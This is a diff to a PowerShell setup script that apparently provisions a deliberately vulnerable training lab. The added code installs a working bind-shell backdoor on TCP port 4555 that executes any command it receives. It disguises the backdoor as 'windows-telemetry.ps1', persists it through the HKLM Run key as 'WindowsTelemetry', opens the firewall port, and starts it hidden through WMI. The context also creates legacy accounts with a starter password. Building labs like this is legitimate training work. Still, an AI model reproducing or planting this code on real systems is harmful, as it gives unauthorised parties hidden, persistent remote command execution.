@@ -182,6 +182,15 @@ function Install-IhplTrainingArtifacts {
     New-Item -ItemType Directory -Force -Path $trainingRoot, $stagingRoot | Out-Null
     Remove-Item -LiteralPath (Join-Path $trainingRoot 'jenkins-version-review.txt') -Force -ErrorAction SilentlyContinue
 
+    $taskService = New-Object -ComObject 'Schedule.Service'
+    $taskService.Connect()
+    try {
+        $null = $taskService.GetFolder('\IHPL')
+    }
+    catch {
+        $null = $taskService.GetFolder('\').CreateFolder('IHPL')
+    }
+
     foreach ($account in @('flightops-old', 'rocketvendor')) {
         Ensure-IhplLocalUser -Name $account -Password $StarterPassword -Groups @('Remote Desktop Users') -Description 'Legacy IHPL service account'
     }
@@ -212,7 +221,89 @@ if (Test-Path -LiteralPath $command) {
 whoami > C:\ProgramData\IHPL\Training\release-command.log
 '@ | Set-Content -LiteralPath (Join-Path $stagingRoot 'release.cmd') -Encoding ASCII
 
-    Write-Host '[Assembly] Functional findings installed, including the writable SYSTEM command path.'
+    $backdoorScript = Join-Path $trainingRoot 'windows-telemetry.ps1'
+    @'
+$endpoint = [Net.IPEndPoint]::new([Net.IPAddress]::Any, 4555)
+$listener = [Net.Sockets.TcpListener]::new($endpoint)
+$listener.Start()
+try {
+    while ($true) {
+        $client = $listener.AcceptTcpClient()
+        try {
+            $stream = $client.GetStream()
+            $reader = [IO.StreamReader]::new($stream)
+            $writer = [IO.StreamWriter]::new($stream)
+            $writer.AutoFlush = $true
+            $writer.WriteLine('Assembly telemetry support')
+            while ($client.Connected) {
+                $writer.Write('support> ')
+                $command = $reader.ReadLine()
+                if ($null -eq $command -or $command -eq 'exit') { break }
+                $output = (& $env:ComSpec /d /c $command 2>&1 | Out-String)
+                $writer.Write($output)
+            }
+        }
+        finally {
+            $client.Dispose()
+        }
+    }
+}
+finally {
+    $listener.Stop()
+}
+'@ | Set-Content -LiteralPath $backdoorScript -Encoding UTF8
+
+    $windowsPowerShell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
+    $backdoorCommand = "`"$windowsPowerShell`" -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backdoorScript`""
+    $registryBase = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
+        [Microsoft.Win32.RegistryHive]::LocalMachine,
+        [Microsoft.Win32.RegistryView]::Registry64
+    )
+    try {
+        $runKey = $registryBase.CreateSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
+        try {
+            $runKey.SetValue('WindowsTelemetry', $backdoorCommand, [Microsoft.Win32.RegistryValueKind]::String)
+        }
+        finally {
+            $runKey.Dispose()
+        }
+    }
+    finally {
+        $registryBase.Dispose()
+    }
+
+    Remove-NetFirewallRule -DisplayName 'IHPL Assembly Support 4555' -ErrorAction SilentlyContinue
+    New-NetFirewallRule -DisplayName 'IHPL Assembly Support 4555' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4555 -Profile Any | Out-Null
+
+    $backdoorProcess = Get-CimInstance -ClassName Win32_Process -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*windows-telemetry.ps1*' } |
+        Select-Object -First 1
+    if ($null -eq $backdoorProcess) {
+        # WMI creates the listener outside the setup console, so setup never waits
+        # on its command loop and the process is independent of the RDP session.
+        $creation = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $backdoorCommand }
+        if ($creation.ReturnValue -ne 0) {
+            throw "Unable to start the Assembly autorun backdoor (Win32 error $($creation.ReturnValue))."
+        }
+    }
+
+    $backdoorReady = $false
+    for ($attempt = 1; $attempt -le 40; $attempt++) {
+        $backdoorSocket = Get-NetTCPConnection -LocalPort 4555 -State Listen -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($null -ne $backdoorSocket) {
+            $socketProcess = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $($backdoorSocket.OwningProcess)" -ErrorAction SilentlyContinue
+            if ($null -ne $socketProcess -and $socketProcess.CommandLine -like '*windows-telemetry.ps1*') {
+                $backdoorReady = $true
+                break
+            }
+        }
+        Start-Sleep -Milliseconds 250
+    }
+    if (-not $backdoorReady) {
+        throw 'The Assembly autorun backdoor did not begin listening on TCP 4555 within 10 seconds.'
+    }
+
+    Write-Host '[Assembly] Functional findings installed, including the writable SYSTEM command path and autorun backdoor.'
 }
 
 function Save-VerifiedMsi {
